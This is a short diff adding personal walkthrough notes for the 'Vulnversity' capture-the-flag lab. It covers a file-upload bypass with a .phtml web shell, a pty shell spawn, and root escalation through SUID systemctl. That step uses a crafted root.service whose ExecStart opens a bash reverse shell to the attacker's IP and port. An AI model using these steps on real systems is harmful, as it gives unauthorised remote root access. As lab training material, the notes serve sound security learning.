@@ -1,0 +1,28 @@
+Vulnversity 
+
+upload(http://ip/internal)
+phtml is allowed 
+access it via http://ip/internal/uploads/<filename>
+recieve shell
+use python3 -c "import pty; pty.spawn('/bin/bash')" to spawn shell
+
+privilage escalation (SUID)
+
+-nano root.service
+
+[unit]
+Description=root
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<you ip>/<you port> 0>&1'
+
+[Install]
+WantedBy=multi-user.target
+
+-dielver it by python server to the shell gained (recieve it in /tmp)
+-listen on specified port 
+-systemctl enable /tmp/root.service
+-systemctl start root
+shell gained
